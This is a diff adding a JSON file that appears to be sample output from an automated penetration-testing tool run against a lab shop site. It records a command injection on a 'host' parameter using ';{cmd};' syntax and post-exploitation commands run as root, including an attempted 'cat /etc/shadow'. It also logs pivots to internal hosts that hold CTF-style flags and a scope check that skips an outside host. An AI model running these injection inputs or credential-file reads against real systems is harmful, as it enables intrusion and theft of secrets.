@@ -1,0 +1,85 @@
+{
+  "result": {
+    "target": "http://shop.local/api/ping",
+    "param": "host",
+    "kind": "cmdi",
+    "in_scope": true,
+    "attempted": true,
+    "verified": true,
+    "technique": "cmdi",
+    "cwe": "CWE-78",
+    "proof": "OS command injection confirmed on 'host': injected shell arithmetic was evaluated (syntax ';{cmd};')",
+    "evidence": [
+      "param 'host' probed with a command-injection arithmetic oracle",
+      "computed oracle 'aeg1s7k9zci-10587703' observed (syntax ';{cmd};')",
+      "3 request(s) sent; all non-destructive (echo + arithmetic only)"
+    ],
+    "requests": 3,
+    "note": "stopped at proof; no shell, persistence, or lateral movement beyond scope",
+    "post_exploit": {
+      "ran": true,
+      "flag": "FLAG{c0mmand_1nj3ction_f00thold}",
+      "flag_path": "/root/flag.txt",
+      "files_read": [
+        {
+          "path": "/etc/hostname",
+          "content": "shop-web-01"
+        }
+      ],
+      "commands": [
+        {
+          "command": "id",
+          "ok": true,
+          "output": "uid=0(root) gid=0(root) groups=0(root)"
+        },
+        {
+          "command": "cat /root/flag.txt",
+          "ok": true,
+          "output": "FLAG{c0mmand_1nj3ction_f00thold}"
+        },
+        {
+          "command": "cat /etc/shadow",
+          "ok": false,
+          "output": "cat: /etc/shadow: Permission denied"
+        }
+      ],
+      "evidence": [
+        "read-only proof commands only; no writes, no persistence"
+      ],
+      "requests": 2,
+      "note": ""
+    },
+    "lateral": {
+      "ran": true,
+      "discovered": [
+        "db.internal.shop.local",
+        "cache.internal.shop.local",
+        "partner.example.com"
+      ],
+      "refused_out_of_scope": [
+        "partner.example.com"
+      ],
+      "pivots": [
+        {
+          "url": "http://db.internal.shop.local/status",
+          "host": "db.internal.shop.local",
+          "reachable": true,
+          "flag": "FLAG{lateral_pivot_to_db}",
+          "detail": "in-scope host; read-only GET returned a status page containing a flag"
+        }
+      ],
+      "capped": [
+        "cache.internal.shop.local"
+      ],
+      "requests": 4,
+      "note": "only in-scope hosts acted on; out-of-scope hosts seen but never touched; capped by max_hosts=2"
+    }
+  },
+  "events": [
+    { "type": "scope_check", "target": "http://shop.local/api/ping", "in_scope": true },
+    { "type": "exploit_result", "verified": true, "cwe": "CWE-78" },
+    { "type": "post_exploit_result", "ran": true, "flag": true },
+    { "type": "lateral_result", "ran": true, "pivots": 1 }
+  ],
+  "engagement": "shop.local-demo (sample data)"
+}
